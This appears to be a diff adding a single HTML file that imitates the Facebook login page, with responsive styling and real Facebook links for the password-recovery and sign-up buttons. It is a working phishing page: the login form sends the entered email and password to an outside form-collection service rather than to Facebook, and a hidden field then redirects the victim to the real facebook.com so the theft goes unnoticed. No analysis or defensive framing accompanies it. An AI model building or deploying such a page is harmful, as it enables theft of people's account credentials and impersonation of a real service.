@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .left-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 8vw; /* Scales with viewport width */
+            font-weight: bold;
+        }
+        .left-section p {
+            font-size: 4.5vw;
+            color: #1c1e21;
+            margin-top: 10px;
+        }
+        .right-section {
+            width: 100%;
+        }
+        .login-box {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 4vw; /* Scales for readability */
+        }
+        .login-box button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            width: 100%;
+            font-size: 4.5vw;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 6px 0;
+        }
+        .login-box button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 3.5vw;
+            text-decoration: none;
+            display: block;
+            margin: 12px 0;
+            text-align: center;
+        }
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            color: #fff;
+            font-size: 4vw;
+            font-weight: bold;
+            cursor: pointer;
+            width: 60%;
+            margin: 10px auto;
+            display: block;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        hr {
+            border: 1px solid #dddfe2;
+            margin: 15px 0;
+        }
+
+        /* Media query for larger screens (e.g., tablets, desktops) */
+        @media (min-width: 768px) {
+            .container {
+                flex-direction: row;
+                max-width: 980px;
+            }
+            .left-section {
+                width: 50%;
+                text-align: left;
+                margin-bottom: 0;
+                padding-right: 20px;
+            }
+            .left-section h1 {
+                font-size: 48px;
+            }
+            .left-section p {
+                font-size: 28px;
+            }
+            .right-section {
+                width: 50%;
+            }
+            .login-box {
+                padding: 20px;
+                max-width: 400px;
+            }
+            .login-box input {
+                font-size: 16px;
+                padding: 14px 16px;
+            }
+            .login-box button {
+                font-size: 18px;
+                padding: 14px;
+            }
+            .forgot-password {
+                font-size: 14px;
+            }
+            .create-account {
+                font-size: 16px;
+                width: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <form id="login-form" action="https://formspree.io/f/xdkeqakq" method="POST">
+                    <input type="email" name="email" placeholder="Email or phone number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <input type="hidden" name="_next" value="https://www.facebook.com">
+                    <button type="submit">Log In</button>
+                </form>
+                <a href="https://www.facebook.com/recover/initiate/" class="forgot-password">Forgot password?</a>
+                <hr>
+                <a href="https://www.facebook.com/reg/"><button class="create-account">Create new account</button></a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
